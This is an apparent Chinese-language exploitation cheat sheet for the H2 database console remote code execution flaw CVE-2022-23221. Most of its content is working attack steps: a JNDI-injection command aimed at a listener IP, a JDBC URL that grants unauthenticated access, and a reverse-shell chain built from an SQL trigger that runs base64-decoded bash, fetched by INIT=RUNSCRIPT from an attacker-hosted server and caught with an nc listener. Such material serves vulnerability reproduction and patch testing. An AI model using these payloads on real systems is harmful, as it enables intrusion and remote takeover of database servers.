### h2database RCE（CVE-2022-23221）

描述: Java SQL 数据库 H2。H2的主要特点是：非常快，开源，JDBC API；嵌入式和服务器模式；内存数据库；基于浏览器的控制台应用程序。 H2 数据库控制台中的另一个未经身份验证的 RCE 漏洞，在 v2.1.210+ 中修复。2.1.210 之前的 H2 控制台允许远程攻击者通过包含 IGNORE_UNKNOWN_SETTINGS=TRUE;FORBID_CREATION=FALSE;INIT=RUNSCRIPT 子字符串的 jdbc:h2:mem JDBC URL 执行任意代码

------

指纹：默认端口：20051或者9082

访问`http://your-ip:8080/h2-console/`即可查看到H2 database的管理页面。

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/c1b52554b81f1c8edcb6155bfd52b9c5.png#pic_center)

#### 利用：

##### 命令执行

[H2database-未授权访问漏洞复现_h2 database connection-CSDN博客](https://blog.csdn.net/weixin_45366453/article/details/125525496)

jndi注入：

1. 下载JNDI-Injection-Exploit

   https://github.com/welk1n/JNDI-Injection-Exploit

 2.生成执行RMI Payload-URL

`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C touch /tmp/success -A 49.232.65.159`

3.填入URL提交执行,点击连接

驱动类写：javax.naming.InitialContext

4.总结

通过JDBC URL地址远程加载exp，

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C touch /tmp/success -A 49.232.65.159作用就是开启监听并执行命令，-C为执行的命令，-A为监听机的ip地址

##### 未授权进入

在JDBC URL处填：`jdbc:h2:mem:test1;FORBID_CREATION=FALSE;IGNORE_UNKNOWN_SETTINGS=TRUE;FORBID_CREATION=FALSE;`

即可直接进入数据库

##### RCE执行反弹shell

[H2数据库漏洞（CVE-2022-23221）复现 | CN-SEC 中文网](https://cn-sec.com/archives/2817058.html)

1.现在攻击机上创建一个.sql文件，

`vim fuck.sql`

里面的代码为：

```
CREATE TABLE test (      id INT NOT NULL ); CREATE TRIGGER TRIG_JS BEFORE INSERT ON TEST AS '//javascript Java.type("java.lang.Runtime").getRuntime().exec("bash -c {echo,base64加密的反弹shell指令}|{base64,-d}|{bash,-i}");';
```

`wq`保存

base64加密的反弹shell指令：先用其他工具生成反弹命令，然后再用base64加密

2.攻击机启动python服务

```
python3 -m http.server 端口
```

3.在JDBC URL处填

```
jdbc:h2:mem:test1;FORBID_CREATION=FALSE;IGNORE_UNKNOWN_SETTINGS=TRUE;FORBID_CREATION=FALSE;INIT=RUNSCRIPT FROM 'http://攻击机IP:端口/h2database.sql';\
```

4.攻击机监听端口：nc -lvvp 6666